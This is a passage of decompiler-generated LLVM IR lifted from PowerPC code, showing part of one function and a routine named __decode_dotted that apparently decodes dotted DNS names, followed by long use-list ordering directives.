  %v0_10017844 = phi i32 [ %v0_10017820, %dec_label_pc_10017818 ], [ %v0_10017844.pre, %dec_label_pc_1001782c ]
  %v0_10017860 = phi i32 [ %v2_10017824, %dec_label_pc_10017818 ], [ %v1_10017830, %dec_label_pc_1001782c ]
  %v0_10017838 = load i32, i32* @r28, align 4
  %v1_10017838 = load i32, i32* %r27.global-to-local, align 4
  %v2_10017838 = sub i32 %v1_10017838, %v0_10017838
  %v1_1001783c = add i32 %v0_10017838, 1
  store i32 %v1_1001783c, i32* %r11.global-to-local, align 4
  %v1_10017840 = add i32 %v2_10017838, -1
  store i32 %v0_10017844, i32* @r4, align 4
  %v0_10017848 = load i32, i32* @r29, align 4
  %v2_10017848 = add i32 %v0_10017848, %v1_1001783c
  store i32 %v2_10017848, i32* @r3, align 4
  store i32 %v0_10017860, i32* @r5, align 4
  %v2_10017850 = icmp ult i32 %v0_10017860, %v1_10017840
  %v1_10017854 = add i32 %v0_10017854, 1
  store i32 %v1_10017854, i32* @r31, align 4
  %v3_10017834.not = icmp ne i32 %v0_10017860, 0
  %or.cond = and i1 %v2_10017850, %v3_10017834.not
  br i1 %or.cond, label %dec_label_pc_10017860, label %dec_label_pc_100178a8

dec_label_pc_10017860:                            ; preds = %dec_label_pc_10017834
  %v3_10017860 = trunc i32 %v0_10017860 to i8
  %v4_10017860 = add i32 %v0_10017848, %v0_10017838
  %v5_10017860 = inttoptr i32 %v4_10017860 to i8*
  store i8 %v3_10017860, i8* %v5_10017860, align 1
  %v0_10017864 = load i32, i32* %r11.global-to-local, align 4
  %v1_10017864 = load i32, i32* %r0.global-to-local, align 4
  %v2_10017864 = add i32 %v1_10017864, %v0_10017864
  store i32 %v2_10017864, i32* @r28, align 4
  store i32 268531820, i32* @lr, align 4
  %v0_10017868 = call i32 @memcpy()
  store i32 %v0_10017868, i32* %r3.global-to-local, align 4
  %v0_1001786c = load i32, i32* @r30, align 4
  %v3_1001786c = icmp eq i32 %v0_1001786c, 0
  br i1 %v3_1001786c, label %dec_label_pc_10017890, label %dec_label_pc_10017860.dec_label_pc_10017874_crit_edge

dec_label_pc_10017860.dec_label_pc_10017874_crit_edge: ; preds = %dec_label_pc_10017860
  %v0_10017874.pre = load i32, i32* @r31, align 4
  %v3_10017874 = icmp eq i32 %v0_10017874.pre, 0
  store i32 %v0_10017874.pre, i32* @r3, align 4
  br i1 %v3_10017874, label %dec_label_pc_10017890, label %dec_label_pc_10017884

dec_label_pc_10017884:                            ; preds = %entry, %dec_label_pc_10017860.dec_label_pc_10017874_crit_edge
  %v0_1001788414 = phi i32 [ %v0_10017874.pre, %dec_label_pc_10017860.dec_label_pc_10017874_crit_edge ], [ %tmp, %entry ]
  %v1_10017884 = inttoptr i32 %v0_1001788414 to i8*
  %v2_10017884 = load i8, i8* %v1_10017884, align 1
  %v3_10017884 = zext i8 %v2_10017884 to i32
  store i32 %v3_10017884, i32* %r0.global-to-local, align 4
  %v3_10017888 = icmp eq i8 %v2_10017884, 0
  br i1 %v3_10017888, label %dec_label_pc_10017890, label %dec_label_pc_10017818

dec_label_pc_10017890:                            ; preds = %dec_label_pc_10017860.dec_label_pc_10017874_crit_edge, %dec_label_pc_10017860, %dec_label_pc_10017884, %entry
  %v0_10017890 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_10017890, 1
  br i1 %tmp10, label %dec_label_pc_100178a8, label %dec_label_pc_10017898

dec_label_pc_10017898:                            ; preds = %dec_label_pc_10017890
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001789c = load i32, i32* @r28, align 4
  %v1_1001789c = add i32 %v0_1001789c, 1
  store i32 %v1_1001789c, i32* %r3.global-to-local, align 4
  %v1_100178a0 = load i32, i32* @r29, align 4
  %v4_100178a0 = add i32 %v1_100178a0, %v0_1001789c
  %v5_100178a0 = inttoptr i32 %v4_100178a0 to i8*
  store i8 0, i8* %v5_100178a0, align 1
  %v0_100178bc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100178ac

dec_label_pc_100178a8:                            ; preds = %dec_label_pc_10017834, %dec_label_pc_10017890
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100178ac

dec_label_pc_100178ac:                            ; preds = %dec_label_pc_10017898, %dec_label_pc_100178a8
  %v0_100178bc = phi i32 [ %v0_100178bc.pre, %dec_label_pc_10017898 ], [ -1, %dec_label_pc_100178a8 ]
  store i32 %v0_100177f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_100178bc

; uselistorder directives
  uselistorder i32 %v0_1001788414, { 1, 0 }
  uselistorder i32 %v0_10017874.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10017860, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10017830, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 1, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 ()* @__GI_strlen, { 24, 49, 57, 56, 55, 54, 53, 52, 51, 22, 50, 23, 14, 15, 16, 58, 48, 1, 47, 2, 46, 45, 44, 3, 43, 7, 6, 42, 41, 40, 5, 4, 39, 38, 37, 12, 36, 11, 35, 34, 10, 33, 9, 32, 8, 31, 30, 13, 29, 28, 27, 26, 25, 21, 0, 20, 18, 19, 17 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0 }
  uselistorder i32 46, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_100178ac, { 1, 0 }
  uselistorder label %dec_label_pc_100178a8, { 1, 0 }
  uselistorder label %dec_label_pc_10017890, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10017884, { 1, 0 }
  uselistorder label %dec_label_pc_10017834, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_100178c4 = call i32 @__asm_mfcr()
  store i32 %v0_100178c4, i32* @r26, align 4
  %v3_100178d0 = icmp eq i32 %v0_100178c4, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_100178e0 = load i32, i32* @r6, align 4
  store i32 %v0_100178e0, i32* @r24, align 4
  br i1 %v3_100178d0, label %dec_label_pc_10017998, label %dec_label_pc_100178e8

dec_label_pc_100178e8:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001797414 = load i32, i32* @r4, align 4
  %v2_1001797415 = add i32 %v1_1001797414, %v0_100178c4
  %v3_1001797416 = inttoptr i32 %v2_1001797415 to i8*
  %v4_1001797417 = load i8, i8* %v3_1001797416, align 1
  %v5_1001797418 = zext i8 %v4_1001797417 to i32
  store i32 %v5_1001797418, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_1001797c20 = icmp eq i8 %v4_1001797417, 0
  br i1 %v3_1001797c20, label %dec_label_pc_10017988, label %dec_label_pc_100178f8

dec_label_pc_100178f8:                            ; preds = %dec_label_pc_100178e8, %dec_label_pc_10017970
  %v3_1001797822 = phi i1 [ %v3_10017978, %dec_label_pc_10017970 ], [ false, %dec_label_pc_100178e8 ]
  %v5_1001797421 = phi i32 [ %v5_10017974, %dec_label_pc_10017970 ], [ %v5_1001797418, %dec_label_pc_100178e8 ]
  br i1 %v3_1001797822, label %dec_label_pc_10017900, label %dec_label_pc_100178fc

dec_label_pc_100178fc:                            ; preds = %dec_label_pc_100178f8
  %v0_100178fc = load i32, i32* %r27.global-to-local, align 4
  %v1_100178fc = add i32 %v0_100178fc, 1
  store i32 %v1_100178fc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10017900

dec_label_pc_10017900:                            ; preds = %dec_label_pc_100178f8, %dec_label_pc_100178fc
  %v1_10017900 = call i32 @__asm_rlwinm(i32 %v5_1001797421, i32 0, i32 24, i32 25)
  %v0_10017904 = load i32, i32* @r4, align 4
  %v1_10017904 = add i32 %v0_10017904, 1
  store i32 %v1_10017904, i32* @r30, align 4
  %v3_10017908 = icmp eq i32 %v1_10017900, 192
  br i1 %v3_10017908, label %dec_label_pc_10017910, label %dec_label_pc_10017930

dec_label_pc_10017910:                            ; preds = %dec_label_pc_10017900
  %v0_10017910 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10017910, label %dec_label_pc_10017918, label %dec_label_pc_10017914

dec_label_pc_10017914:                            ; preds = %dec_label_pc_10017910
  %v0_10017914 = load i32, i32* %r27.global-to-local, align 4
  %v1_10017914 = add i32 %v0_10017914, 1
  store i32 %v1_10017914, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10017918

dec_label_pc_10017918:                            ; preds = %dec_label_pc_10017910, %dec_label_pc_10017914
  %v0_10017918 = load i32, i32* @r26, align 4
  %v2_10017918 = add i32 %v0_10017918, %v1_10017904
  %v3_10017918 = inttoptr i32 %v2_10017918 to i8*
  %v4_10017918 = load i8, i8* %v3_10017918, align 1
  %v5_10017918 = zext i8 %v4_10017918 to i32
  %v1_1001791c = call i32 @__asm_rlwinm(i32 %v5_1001797421, i32 8, i32 18, i32 23)
  %v0_10017920 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10017920, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10017928 = or i32 %v5_10017918, %v1_1001791c
  store i32 %v2_10017928, i32* @r4, align 4
  br label %dec_label_pc_10017970

dec_label_pc_10017930:                            ; preds = %dec_label_pc_10017900
  %v0_10017930 = load i32, i32* %r11.global-to-local, align 4
  %v2_10017930 = add i32 %v0_10017930, %v5_1001797421
  store i32 %v2_10017930, i32* @r29, align 4
  %v1_10017934 = add i32 %v2_10017930, 1
  store i32 %v1_10017934, i32* @r28, align 4
  %v1_10017938 = load i32, i32* @r24, align 4
  %v2_10017938 = icmp ult i32 %v1_10017934, %v1_10017938
  br i1 %v2_10017938, label %dec_label_pc_10017940, label %dec_label_pc_10017998

dec_label_pc_10017940:                            ; preds = %dec_label_pc_10017930
  %v0_10017940 = load i32, i32* @r26, align 4
  %v2_10017940 = add i32 %v0_10017940, %v1_10017904
  store i32 %v2_10017940, i32* @r4, align 4
  %v0_10017944 = load i32, i32* @r25, align 4
  %v2_10017944 = add i32 %v0_10017944, %v0_10017930
  store i32 %v2_10017944, i32* @r3, align 4
  store i32 %v5_1001797421, i32* @r5, align 4
  store i32 268532048, i32* @lr, align 4
  %v0_1001794c = call i32 @memcpy()
  %v0_10017950 = load i32, i32* @r30, align 4
  %v2_10017950 = add i32 %v0_10017950, %v5_1001797421
  store i32 %v2_10017950, i32* @r4, align 4
  %v0_10017954 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10017954, label %dec_label_pc_1001795c, label %dec_label_pc_10017958

dec_label_pc_10017958:                            ; preds = %dec_label_pc_10017940
  %v0_10017958 = load i32, i32* %r27.global-to-local, align 4
  %v2_10017958 = add i32 %v0_10017958, %v5_1001797421
  store i32 %v2_10017958, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1001795c

dec_label_pc_1001795c:                            ; preds = %dec_label_pc_10017940, %dec_label_pc_10017958
  %v0_1001795c = load i32, i32* @r26, align 4
  %v2_1001795c = add i32 %v0_1001795c, %v2_10017950
  %v3_1001795c = inttoptr i32 %v2_1001795c to i8*
  %v4_1001795c = load i8, i8* %v3_1001795c, align 1
  %v3_10017960 = icmp eq i8 %v4_1001795c, 0
  br i1 %v3_10017960, label %dec_label_pc_1001796c, label %dec_label_pc_10017968

dec_label_pc_10017968:                            ; preds = %dec_label_pc_1001795c
  br label %dec_label_pc_1001796c

dec_label_pc_1001796c:                            ; preds = %dec_label_pc_1001795c, %dec_label_pc_10017968
  %v0_1001796c.off0 = phi i8 [ 0, %dec_label_pc_1001795c ], [ 46, %dec_label_pc_10017968 ]
  %v1_1001796c = load i32, i32* @r25, align 4
  %v2_1001796c = load i32, i32* @r29, align 4
  %v4_1001796c = add i32 %v2_1001796c, %v1_1001796c
  %v5_1001796c = inttoptr i32 %v4_1001796c to i8*
  store i8 %v0_1001796c.off0, i8* %v5_1001796c, align 1
  %v0_10017970.pre = load i32, i32* @r28, align 4
  %v0_10017978.pre.pre = load i32, i32* @r23, align 4
  %v1_10017974.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10017970

dec_label_pc_10017970:                            ; preds = %dec_label_pc_10017918, %dec_label_pc_1001796c
  %v1_10017974 = phi i32 [ %v2_10017928, %dec_label_pc_10017918 ], [ %v1_10017974.pre, %dec_label_pc_1001796c ]
  %v0_10017978.pre = phi i32 [ 0, %dec_label_pc_10017918 ], [ %v0_10017978.pre.pre, %dec_label_pc_1001796c ]
  %v0_10017970 = phi i32 [ %v0_10017920, %dec_label_pc_10017918 ], [ %v0_10017970.pre, %dec_label_pc_1001796c ]
  %v0_10017974.pre = load i32, i32* @r26, align 4
  store i32 %v0_10017970, i32* %r11.global-to-local, align 4
  %v2_10017974 = add i32 %v1_10017974, %v0_10017974.pre
  %v3_10017974 = inttoptr i32 %v2_10017974 to i8*
  %v4_10017974 = load i8, i8* %v3_10017974, align 1
  %v5_10017974 = zext i8 %v4_10017974 to i32
  store i32 %v5_10017974, i32* @r31, align 4
  %v3_10017978 = icmp eq i32 %v0_10017978.pre, 0
  store i1 %v3_10017978, i1* %cr4_eq.global-to-local, align 1
  %v3_1001797c = icmp eq i8 %v4_10017974, 0
  br i1 %v3_1001797c, label %dec_label_pc_10017984, label %dec_label_pc_100178f8

dec_label_pc_10017984:                            ; preds = %dec_label_pc_10017970
  %v0_1001798c.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_10017978, label %dec_label_pc_10017998, label %dec_label_pc_10017988

dec_label_pc_10017988:                            ; preds = %dec_label_pc_100178e8, %dec_label_pc_10017984
  %v0_1001798c.pre26 = phi i32 [ %v0_1001798c.pre.pre, %dec_label_pc_10017984 ], [ 0, %dec_label_pc_100178e8 ]
  %v1_10017988 = add i32 %v0_1001798c.pre26, 1
  store i32 %v1_10017988, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10017998

dec_label_pc_10017998:                            ; preds = %dec_label_pc_10017930, %dec_label_pc_10017984, %dec_label_pc_10017988, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_10017988, %dec_label_pc_10017988 ], [ %v0_1001798c.pre.pre, %dec_label_pc_10017984 ], [ -1, %dec_label_pc_10017930 ]
  %v1_100179a8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100178c4)
  %v9_100179a8 = extractvalue %0 %v1_100179a8, 7
  store i4 %v9_100179a8, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1001798c.pre.pre, { 1, 0 }
  uselistorder i1 %v3_10017978, { 0, 2, 1 }
  uselistorder i32 %v5_10017974, { 1, 0 }
  uselistorder i32 %v5_1001797421, { 5, 4, 1, 3, 0, 2 }
  uselistorder i32 %v0_100178c4, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i1* %cr4_eq.global-to-local, { 3, 1, 2, 0 }
  uselistorder i4* @cr4, { 0, 1, 2, 5, 3, 6, 4 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 7, 8, 11, 3, 9, 5, 6, 0, 1, 2, 13, 4, 12, 10 }
  uselistorder i32 ()* @memcpy, { 22, 21, 20, 19, 9, 17, 16, 30, 29, 28, 27, 3, 34, 11, 10, 0, 8, 7, 15, 1, 18, 6, 5, 4, 33, 26, 2, 32, 31, 25, 24, 23, 12, 14, 13 }
  uselistorder i32* @r5, { 50, 51, 52, 10, 17, 91, 4, 53, 54, 21, 89, 90, 94, 99, 56, 57, 5, 6, 93, 18, 19, 20, 92, 22, 23, 104, 24, 25, 103, 26, 27, 28, 35, 7, 58, 2, 59, 71, 72, 95, 96, 97, 98, 105, 39, 73, 74, 75, 76, 77, 78, 118, 47, 48, 100, 101, 60, 61, 110, 111, 112, 36, 55, 79, 80, 81, 119, 120, 121, 122, 113, 114, 3, 115, 116, 117, 62, 82, 84, 83, 85, 0, 86, 87, 88, 106, 107, 64, 65, 68, 69, 41, 70, 66, 8, 29, 30, 108, 109, 9, 31, 102, 11, 12, 32, 1, 33, 34, 13, 14, 15, 16, 40, 37, 38, 42, 43, 44, 45, 46, 49, 63, 67 }
  uselistorder i32* @r29, { 137, 138, 139, 140, 141, 45, 46, 47, 48, 49, 50, 51, 2, 142, 22, 143, 144, 145, 146, 147, 149, 148, 150, 151, 152, 153, 154, 155, 52, 53, 54, 55, 56, 3, 156, 157, 158, 159, 160, 161, 162, 163, 57, 58, 4, 266, 267, 268, 269, 5, 256, 239, 240, 190, 191, 192, 243, 244, 277, 272, 273, 274, 275, 164, 165, 166, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 0, 241, 242, 59, 60, 61, 62, 63, 65, 64, 66, 67, 68, 282, 69, 70, 6, 71, 7, 72, 73, 74, 75, 76, 77, 78, 79, 8, 283, 80, 257, 31, 9, 32, 258, 259, 260, 261, 262, 263, 264, 265, 82, 81, 83, 84, 85, 86, 87, 303, 304, 221, 222, 223, 220, 224, 29, 245, 246, 10, 247, 248, 249, 250, 251, 252, 305, 306, 307, 308, 309, 270, 271, 218, 219, 310, 311, 312, 313, 314, 11, 315, 321, 322, 323, 284, 285, 286, 287, 288, 276, 181, 182, 183, 184, 185, 12, 186, 187, 331, 332, 333, 167, 168, 225, 226, 13, 227, 253, 254, 255, 193, 194, 23, 195, 196, 197, 198, 199, 200, 30, 14, 1, 201, 202, 188, 189, 228, 229, 230, 231, 232, 233, 234, 237, 15, 21, 16, 238, 33, 235, 236, 334, 335, 336, 337, 203, 204, 205, 206, 207, 208, 209, 17, 210, 134, 211, 212, 213, 214, 215, 128, 327, 328, 24, 25, 329, 108, 109, 110, 316, 317, 320, 324, 18, 325, 88, 89, 90, 91, 92, 19, 93, 94, 95, 96, 97, 98, 26, 99, 278, 279, 280, 281, 100, 101, 102, 103, 104, 34, 35, 105, 106, 20, 107, 36, 37, 294, 295, 296, 297, 298, 27, 111, 28, 112, 113, 114, 115, 116, 38, 39, 40, 41, 42, 326, 43, 44, 299, 300, 301, 302, 117, 118, 119, 289, 290, 291, 292, 293, 120, 121, 122, 123, 124, 125, 126, 127, 330, 129, 318, 319, 132, 133, 130, 131, 135, 136, 216, 217 }
  uselistorder i32* @r28, { 5, 63, 64, 65, 66, 67, 68, 40, 41, 73, 74, 69, 70, 71, 72, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 24, 6, 23, 25, 26, 27, 28, 29, 30, 85, 89, 86, 87, 88, 2, 31, 7, 32, 33, 162, 163, 164, 165, 127, 152, 153, 154, 166, 167, 168, 169, 170, 171, 172, 173, 174, 92, 93, 34, 35, 36, 37, 38, 39, 42, 43, 44, 178, 179, 18, 45, 3, 16, 19, 8, 4, 183, 184, 128, 9, 155, 156, 157, 158, 159, 10, 185, 186, 187, 200, 207, 196, 197, 198, 199, 180, 181, 94, 95, 201, 202, 203, 204, 205, 90, 91, 160, 161, 96, 11, 97, 98, 99, 100, 101, 102, 103, 104, 129, 130, 131, 12, 132, 133, 13, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 0, 150, 151, 20, 21, 22, 206, 105, 106, 107, 108, 109, 14, 110, 15, 111, 112, 113, 114, 115, 116, 117, 125, 126, 118, 119, 60, 55, 56, 188, 189, 190, 195, 191, 192, 194, 46, 47, 175, 176, 177, 48, 49, 50, 51, 52, 53, 1, 54, 182, 17, 57, 58, 59, 120, 121, 193, 61, 62, 122, 123, 124 }
  uselistorder i32 23, { 2, 0, 1, 6, 7, 3, 4, 5 }
  uselistorder i32 18, { 6, 0, 7, 8, 9, 10, 1, 2, 11, 3, 4, 5 }
  uselistorder i32 8, { 151, 152, 73, 58, 0, 153, 154, 155, 156, 35, 36, 157, 158, 159, 160, 161, 162, 59, 60, 37, 29, 31, 32, 61, 62, 63, 64, 65, 163, 71, 26, 66, 67, 68, 1, 69, 70, 218, 170, 171, 172, 34, 219, 230, 231, 232, 164, 87, 215, 216, 72, 2, 3, 4, 5, 6, 7, 74, 235, 75, 76, 77, 78, 234, 79, 80, 81, 82, 83, 84, 85, 217, 38, 86, 88, 89, 223, 224, 90, 91, 92, 33, 93, 94, 225, 48, 50, 49, 51, 52, 226, 227, 228, 229, 53, 95, 96, 8, 173, 186, 187, 188, 189, 190, 191, 192, 193, 25, 220, 221, 222, 245, 246, 275, 278, 23, 139, 140, 247, 27, 97, 28, 142, 182, 98, 257, 256, 254, 255, 236, 237, 238, 258, 259, 260, 9, 165, 166, 167, 39, 148, 149, 30, 150, 272, 273, 274, 10, 279, 11, 276, 277, 168, 174, 175, 176, 136, 194, 195, 196, 197, 198, 40, 199, 200, 201, 202, 12, 13, 203, 204, 24, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 22, 14, 248, 249, 250, 177, 178, 179, 180, 137, 138, 181, 134, 110, 111, 261, 262, 15, 16, 17, 18, 19, 54, 233, 55, 99, 100, 101, 104, 106, 107, 108, 105, 109, 102, 103, 112, 113, 114, 251, 252, 253, 268, 269, 270, 263, 264, 184, 44, 41, 45, 46, 47, 42, 115, 116, 117, 266, 265, 118, 119, 120, 121, 56, 242, 244, 124, 125, 126, 239, 240, 241, 243, 127, 183, 122, 123, 271, 267, 128, 129, 130, 131, 132, 133, 57, 43, 135, 185, 20, 21, 141, 143, 144, 145, 146, 147, 169 }
  uselistorder i32* @r30, { 182, 183, 184, 10, 185, 114, 11, 73, 74, 75, 187, 189, 190, 191, 192, 193, 186, 188, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 76, 77, 78, 1, 79, 80, 81, 8, 82, 83, 208, 205, 206, 6, 207, 5, 86, 87, 12, 41, 88, 89, 42, 323, 37, 287, 288, 90, 91, 92, 95, 96, 289, 295, 296, 84, 85, 256, 257, 286, 297, 298, 299, 13, 300, 301, 302, 324, 325, 326, 327, 328, 209, 210, 211, 212, 213, 214, 215, 38, 216, 217, 218, 219, 220, 221, 222, 223, 2, 292, 293, 294, 14, 93, 15, 94, 124, 125, 290, 291, 9, 97, 98, 99, 100, 101, 102, 103, 106, 104, 105, 107, 110, 108, 109, 39, 111, 112, 113, 115, 116, 337, 338, 117, 118, 119, 339, 340, 120, 121, 122, 123, 126, 127, 128, 310, 311, 312, 313, 314, 315, 53, 54, 17, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 16, 69, 67, 68, 70, 71, 72, 316, 317, 318, 319, 320, 321, 322, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 18, 19, 141, 142, 20, 143, 144, 258, 259, 260, 261, 262, 21, 303, 304, 305, 306, 307, 22, 351, 352, 353, 354, 23, 355, 382, 393, 383, 384, 356, 145, 0, 179, 24, 180, 181, 361, 362, 363, 364, 341, 342, 346, 343, 344, 345, 329, 330, 331, 332, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 385, 386, 387, 388, 389, 390, 391, 25, 392, 263, 26, 264, 265, 308, 309, 236, 27, 237, 238, 244, 242, 243, 245, 246, 247, 249, 248, 7, 250, 239, 240, 241, 28, 251, 266, 267, 268, 269, 270, 3, 272, 43, 273, 29, 274, 275, 271, 276, 277, 278, 279, 280, 281, 282, 30, 283, 284, 4, 285, 360, 357, 40, 178, 255, 174, 175, 31, 378, 160, 161, 162, 163, 164, 365, 367, 366, 369, 368, 146, 147, 148, 149, 150, 336, 333, 334, 335, 151, 152, 153, 154, 155, 156, 157, 158, 32, 159, 165, 358, 359, 348, 350, 379, 380, 381, 44, 45, 46, 47, 48, 49, 50, 51, 52, 166, 370, 371, 372, 374, 33, 373, 167, 168, 169, 170, 171, 34, 349, 35, 347, 375, 376, 36, 377, 172, 173, 176, 177, 252, 253, 254 }
  uselistorder i1 false, { 3, 4, 6, 7, 8, 9, 10, 11, 17, 18, 21, 0, 19, 24, 25, 26, 5, 20, 22, 23, 14, 13, 1, 15, 16, 2, 12, 27 }
  uselistorder i32* @r31, { 318, 4, 12, 319, 11, 320, 321, 183, 92, 184, 188, 143, 144, 145, 146, 185, 13, 186, 187, 322, 14, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 84, 147, 15, 74, 16, 17, 148, 149, 150, 337, 338, 339, 340, 1, 341, 342, 343, 344, 345, 346, 347, 348, 157, 158, 159, 160, 161, 194, 195, 553, 18, 554, 481, 482, 483, 162, 163, 164, 169, 170, 484, 485, 494, 19, 495, 496, 131, 132, 151, 152, 153, 154, 20, 497, 21, 479, 22, 480, 498, 499, 500, 501, 502, 378, 23, 379, 380, 381, 382, 24, 383, 384, 385, 386, 387, 388, 503, 504, 505, 506, 507, 508, 509, 510, 511, 25, 512, 526, 527, 555, 556, 557, 558, 559, 560, 561, 562, 26, 350, 349, 5, 352, 353, 354, 355, 356, 357, 358, 359, 486, 490, 491, 165, 166, 167, 168, 27, 200, 487, 488, 489, 155, 156, 171, 172, 175, 173, 174, 176, 177, 178, 179, 180, 181, 182, 189, 190, 191, 192, 193, 570, 571, 85, 196, 6, 197, 572, 573, 198, 199, 492, 493, 201, 202, 203, 204, 205, 528, 529, 530, 531, 532, 206, 207, 208, 209, 533, 534, 535, 536, 537, 28, 29, 133, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 306, 307, 308, 309, 389, 30, 390, 391, 31, 392, 393, 32, 394, 395, 446, 447, 448, 513, 514, 33, 515, 516, 517, 518, 34, 519, 35, 520, 521, 522, 83, 523, 0, 602, 603, 604, 36, 86, 605, 75, 606, 37, 607, 608, 609, 610, 611, 612, 613, 614, 87, 672, 673, 81, 313, 615, 616, 316, 317, 210, 211, 212, 213, 214, 215, 216, 314, 315, 7, 631, 632, 633, 634, 635, 636, 637, 643, 574, 583, 575, 576, 577, 38, 578, 579, 580, 581, 582, 298, 299, 300, 301, 39, 563, 564, 565, 360, 361, 362, 41, 363, 364, 365, 40, 366, 367, 368, 369, 370, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 42, 351, 449, 450, 451, 524, 525, 371, 372, 373, 44, 374, 43, 375, 396, 397, 398, 45, 399, 400, 401, 402, 403, 404, 405, 406, 46, 82, 8, 407, 408, 376, 377, 47, 48, 49, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 52, 51, 469, 50, 473, 474, 53, 475, 476, 477, 478, 134, 135, 471, 470, 472, 617, 54, 618, 88, 55, 76, 619, 620, 621, 622, 623, 624, 625, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 421, 420, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 310, 311, 312, 435, 436, 437, 438, 56, 57, 439, 58, 247, 290, 291, 302, 217, 218, 219, 220, 221, 222, 223, 224, 662, 663, 77, 2, 59, 664, 665, 248, 249, 250, 251, 252, 60, 253, 254, 255, 73, 641, 642, 3, 638, 639, 640, 644, 645, 89, 225, 78, 226, 79, 227, 569, 566, 567, 61, 568, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 62, 238, 239, 240, 241, 244, 245, 246, 242, 63, 243, 256, 257, 626, 627, 628, 629, 630, 589, 590, 599, 9, 600, 601, 669, 670, 671, 93, 64, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 10, 258, 260, 65, 66, 67, 259, 136, 137, 138, 139, 140, 141, 142, 280, 281, 261, 262, 646, 647, 650, 651, 652, 653, 654, 655, 656, 657, 658, 648, 68, 649, 263, 264, 265, 266, 591, 592, 593, 594, 595, 598, 267, 268, 269, 270, 271, 272, 587, 584, 585, 586, 80, 588, 596, 69, 597, 660, 70, 661, 90, 659, 273, 274, 275, 276, 277, 278, 279, 282, 283, 284, 285, 286, 71, 287, 288, 72, 289, 292, 293, 294, 440, 441, 442, 443, 444, 445, 295, 296, 297, 666, 667, 668, 303, 304, 305, 91 }
  uselistorder i32* @r23, { 1, 5, 6, 10, 7, 8, 9, 11, 12, 13, 15, 14, 0, 16, 17, 18, 19, 25, 26, 2, 3, 20, 21, 22, 23, 24, 4 }
  uselistorder i32* @r24, { 4, 5, 8, 6, 7, 9, 10, 11, 0, 12, 13, 14, 15, 16, 2, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 3 }
  uselistorder i32* @r6, { 9, 10, 2, 27, 25, 3, 26, 15, 16, 17, 5, 18, 19, 20, 21, 7, 8, 22, 23, 24, 11, 13, 6, 14, 12, 4, 0, 1 }
  uselistorder i32* @r25, { 5, 6, 7, 9, 10, 8, 11, 2, 3, 12, 13, 14, 15, 16, 17, 18, 19, 20, 29, 32, 21, 22, 23, 24, 0, 25, 26, 27, 28, 30, 31, 4, 1 }
